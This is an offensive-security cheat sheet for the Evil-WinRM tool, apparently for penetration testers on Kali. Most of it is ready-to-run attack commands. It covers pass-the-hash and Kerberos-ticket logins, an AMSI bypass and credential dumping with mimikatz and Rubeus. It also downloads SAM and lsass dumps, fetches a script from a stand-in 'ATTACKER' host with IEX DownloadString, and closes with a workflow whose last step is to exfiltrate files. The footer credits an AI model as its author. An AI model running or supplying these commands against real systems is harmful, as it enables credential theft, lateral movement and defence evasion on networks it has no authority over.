# Evil-WinRM

**Tags:** `#evilwinrm` `#winrm` `#lateral` `#postexploitation` `#windows` `#shell` `#passthehash`

Full-featured WinRM shell for Windows remote management. Connects to Windows Remote Management (port 5985/5986) with password, NTLM hash, or Kerberos ticket. Includes built-in commands for file upload/download, PowerShell script loading, .NET assembly execution, and AMSI bypass. The standard interactive shell tool for Windows post-exploitation from Kali.

**Source:** https://github.com/Hackplayers/evil-winrm — pre-installed on Kali
**Install:** `sudo gem install evil-winrm`

```bash
# Password auth
evil-winrm -i 192.168.1.10 -u Administrator -p Password

# Pass the Hash
evil-winrm -i 192.168.1.10 -u Administrator -H NTLMhash
```

> [!note] **WinRM requirements** — Target must have WinRM enabled (default on Server 2012+, disabled on workstations by default). User must be in `Remote Management Users` group or be a local admin. Port 5985 (HTTP) or 5986 (HTTPS).

---

## Connecting

```bash
# Password auth
evil-winrm -i 192.168.1.10 -u Administrator -p 'Password'

# Pass the Hash (NT hash only is fine)
evil-winrm -i 192.168.1.10 -u Administrator -H 'NTLMhash'
evil-winrm -i 192.168.1.10 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:NTLMhash'

# Domain user
evil-winrm -i 192.168.1.10 -u 'DOMAIN\user' -p 'Password'

# Kerberos (set KRB5CCNAME first, add /etc/hosts entry for target)
KRB5CCNAME=ticket.ccache evil-winrm -i dc01.domain.local -r domain.local

# HTTPS (port 5986)
evil-winrm -i 192.168.1.10 -u Administrator -p Password -S

# Custom port
evil-winrm -i 192.168.1.10 -u Administrator -p Password -P 5985

# With SSL cert
evil-winrm -i 192.168.1.10 -u Administrator -p Password -S -c cert.pem -k key.pem
```

---

## File Transfer

```powershell
# Upload to target (in evil-winrm session)
upload /opt/tools/SharpHound.exe C:\Windows\Temp\SharpHound.exe
upload /opt/tools/mimikatz.exe        # uploads to current dir on target

# Download from target
download C:\Windows\System32\config\SAM /tmp/SAM
download C:\Users\Administrator\Documents\passwords.xlsx
download C:\Windows\Temp\lsass.dmp
```

---

## PowerShell Script Loading

```bash
# Specify scripts directory at connection — scripts load via tab-complete in session
evil-winrm -i 192.168.1.10 -u Administrator -p Password -s /opt/ps-scripts/
```

```powershell
# In session — type script name and press Tab to auto-load
Invoke-Mimikatz.ps1

# Or load ad-hoc from HTTP
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')
```

---

## Execute-Assembly (.NET in Memory)

```bash
# Specify assemblies directory at connection
evil-winrm -i 192.168.1.10 -u Administrator -p Password -e /opt/assemblies/
```

```powershell
# In session — Invoke-Binary to run .NET assembly
Invoke-Binary SharpHound.exe -c All
Invoke-Binary Rubeus.exe dump /nowrap
Invoke-Binary Seatbelt.exe -group=all
Invoke-Binary SharpDPAPI.exe triage
```

---

## Built-in Commands

```powershell
# Show available menu options
menu

# AMSI bypass (built-in — patches AMSI in current process)
Bypass-4MSI

# List services
services

# Check current user
whoami /all
```

---

## Common Post-Exploitation Workflow

```powershell
# 1. Connect
evil-winrm -i 192.168.1.10 -u Administrator -H NTLMhash -e /opt/assemblies/ -s /opt/ps-scripts/

# 2. Bypass AMSI before running tools
Bypass-4MSI

# 3. Run BloodHound collection
Invoke-Binary SharpHound.exe -c All
download 20240101120000_BloodHound.zip

# 4. Dump credentials
Invoke-Binary Rubeus.exe dump /nowrap
# Or:
upload /opt/tools/mimikatz.exe
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 5. Exfil interesting files
download C:\Users\Administrator\Desktop\notes.txt
download C:\inetpub\wwwroot\web.config
```

---

## Checking WinRM Availability

```bash
# Port check
nmap -p 5985,5986 192.168.1.10

# NetExec — validates credentials and WinRM access
netexec winrm 192.168.1.10 -u Administrator -p Password
netexec winrm 192.168.1.0/24 -u Administrator -H NTLMhash

# From Windows
Test-WSMan -ComputerName 192.168.1.10
```

---

## OPSEC Notes

- WinRM connections generate Event ID **4624** (logon type 3) and **4648** on the target
- PowerShell ScriptBlock Logging (Event ID **4104**) captures all PS executed in the session
- `Bypass-4MSI` patches AMSI in-process — may trigger EDR behavioral detection
- WinRM leaves logs in `Microsoft-Windows-WinRM/Operational` event channel

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
